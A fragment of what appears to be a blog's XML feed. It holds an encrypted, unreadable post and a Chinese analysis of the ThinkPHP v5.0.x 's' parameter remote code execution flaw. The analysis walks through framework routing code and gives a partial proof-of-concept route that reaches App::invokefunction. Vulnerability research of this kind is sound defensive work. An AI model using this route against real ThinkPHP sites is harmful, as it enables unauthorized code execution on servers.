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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp v5.x App.php s参数RCE</title>
      <link href="2019/02/05/php-thinkphp-v5-x-App-php-rce/"/>
      <url>2019/02/05/php-thinkphp-v5-x-App-php-rce/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>放假了，对thinkphp的几个RCE做一下分析，记录一下XD<br><a id="more"></a></p><h2 id="thinkphp-v5-0-x"><a href="#thinkphp-v5-0-x" class="headerlink" title="thinkphp v5.0.x"></a>thinkphp v5.0.x</h2><h4 id="漏洞相关信息"><a href="#漏洞相关信息" class="headerlink" title="漏洞相关信息"></a>漏洞相关信息</h4><p>漏洞版本：&lt;= 5.0.22<br>补丁：<a href="https://github.com/top-think/framework/commit/4cbc0b5e93314446243ebc7d5f005f9c32864737" target="_blank" rel="noopener">版本更新 · top-think/framework@4cbc0b5 · GitHub</a><br>问题点：library/think/App.php</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="关于thinkphp的url解析方式"><a href="#关于thinkphp的url解析方式" class="headerlink" title="关于thinkphp的url解析方式"></a>关于thinkphp的url解析方式</h5><p>THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如<code>index.php/module/controller/action</code><br>对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式<code>?s=/module/controller/action</code>的方式来访问<br>而这次的漏洞成因就是在于兼容模式处理时存在的问题。<br>首先看 <code>thinkphp/library/think/Request.php</code>的<code>pathinfo</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)])) &#123;</span><br><span class="line">            <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = $_GET[Config::get(<span class="string">'var_pathinfo'</span>)];</span><br><span class="line">            <span class="keyword">unset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = <span class="keyword">isset</span>($_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>]) ? $_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>] : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? <span class="string">'/'</span> : ltrim($_SERVER[<span class="string">'PATH_INFO'</span>], <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值<br>有了pathinfo值，我们再找到具体的解析url的函数，<code>thinkphp/library/think/Route.php</code>的<code>parseUrl</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">        $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">        $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">    &#125;</span><br><span class="line">    $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">    <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">    $route            = [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中parseUrl函数的<code>$url</code>为上面拿到的pathinfo，<code>$depr</code>为默认的分割符<br>首先对<code>$url</code>替换分割符为<code>|</code>，再输入到<code>parseUrlPath</code>函数(根据<code>/</code>分割)，该函数对pathinfo进行分割，产生<code>module</code>、<code>controller</code>、<code>action</code><br>那么现在来看rce的Poc<code>?s=/index/\think\app/invokefunction</code>=&gt;<code>[module:index,controller:\think\app,action:invokefunction]</code><br>其中controller=&gt;\think\app，是php命名空间的表示方式，\think\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数</p><h5 id="漏洞成因点"><a href="#漏洞成因点" class="headerlink" title="漏洞成因点"></a>漏洞成因点</h5><p>上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数<br>看一下拿到module、controller、action后系统的处理<br>thinkphp/library/think/App.php 的 module函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 